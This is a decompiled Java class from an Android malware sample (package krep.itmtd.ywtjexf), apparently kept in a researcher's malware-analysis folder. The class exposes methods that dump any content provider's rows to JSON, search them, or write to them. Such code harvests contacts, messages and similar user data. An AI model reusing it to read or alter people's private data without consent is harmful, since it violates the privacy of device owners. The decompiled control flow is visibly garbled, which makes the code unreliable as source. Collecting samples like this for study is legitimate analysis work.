package krep.itmtd.ywtjexf;

import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class MeContent
{
  Context mContext;
  
  MeContent(Context paramContext)
  {
    this.mContext = paramContext;
  }
  
  @SuppressLint({"NewApi"})
  public String getall(String paramString)
    throws JSONException
  {
    Object localObject = Uri.parse(paramString);
    paramString = new JSONObject();
    JSONArray localJSONArray = new JSONArray();
    for (;;)
    {
      try
      {
        localObject = this.mContext.getContentResolver().query((Uri)localObject, null, null, null, null);
        if (((Cursor)localObject).moveToNext()) {
          continue;
        }
        ((Cursor)localObject).close();
      }
      catch (Exception localException)
      {
        JSONObject localJSONObject;
        int i;
        localException.printStackTrace();
        continue;
        if (localException.getType(i) != 3) {
          continue;
        }
        localJSONObject.put(localException.getColumnName(i), localException.getString(i));
        if (localException.getType(i) != 1) {
          continue;
        }
        localJSONObject.put(localException.getColumnName(i), localException.getInt(i));
        if (localException.getType(i) != 4) {
          continue;
        }
        localJSONObject.put(localException.getColumnName(i), localException.getBlob(i));
        if (localException.getType(i) != 2) {
          continue;
        }
        localJSONObject.put(localException.getColumnName(i), localException.getFloat(i));
        i += 1;
        continue;
      }
      paramString.put("result", localJSONArray);
      return paramString.toString();
      localJSONObject = new JSONObject();
      i = 0;
      if (i < ((Cursor)localObject).getColumnCount()) {
        continue;
      }
      localJSONArray.put(localJSONObject);
    }
  }
  
  public String search(String paramString1, String paramString2)
    throws JSONException
  {
    return search(paramString1, paramString2, null);
  }
  
  @SuppressLint({"NewApi"})
  public String search(String paramString1, String paramString2, String paramString3)
    throws JSONException
  {
    Uri localUri = Uri.parse(paramString1);
    paramString1 = new JSONObject();
    JSONArray localJSONArray = new JSONArray();
    for (;;)
    {
      try
      {
        paramString2 = this.mContext.getContentResolver().query(localUri, null, paramString2, null, paramString3);
        boolean bool = paramString2.moveToNext();
        if (bool) {
          continue;
        }
      }
      catch (Exception paramString2)
      {
        int i;
        paramString2.printStackTrace();
        continue;
        if (paramString2.getType(i) != 3) {
          continue;
        }
        paramString3.put(paramString2.getColumnName(i), paramString2.getString(i));
        if (paramString2.getType(i) != 1) {
          continue;
        }
        paramString3.put(paramString2.getColumnName(i), paramString2.getInt(i));
        if (paramString2.getType(i) != 4) {
          continue;
        }
        paramString3.put(paramString2.getColumnName(i), paramString2.getBlob(i));
        if (paramString2.getType(i) != 2) {
          continue;
        }
        paramString3.put(paramString2.getColumnName(i), paramString2.getFloat(i));
        i += 1;
        continue;
      }
      paramString1.put("result", localJSONArray);
      return paramString1.toString();
      paramString3 = new JSONObject();
      i = 0;
      if (i < paramString2.getColumnCount()) {
        continue;
      }
      localJSONArray.put(paramString3);
    }
  }
  
  public void write(String paramString, String[] paramArrayOfString1, String[] paramArrayOfString2)
  {
    ContentValues localContentValues = new ContentValues();
    int i = 0;
    for (;;)
    {
      if (i >= paramArrayOfString1.length) {}
      try
      {
        this.mContext.getContentResolver().insert(Uri.parse(paramString), localContentValues);
        return;
      }
      catch (Exception paramString)
      {
        paramString.printStackTrace();
      }
      localContentValues.put(paramArrayOfString1[i], paramArrayOfString2[i]);
      i += 1;
    }
  }
}


/* Location:              /home/enzo/Documents/hacking/malwares/krep/classes-dex2jar.jar!/krep/itmtd/ywtjexf/MeContent.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */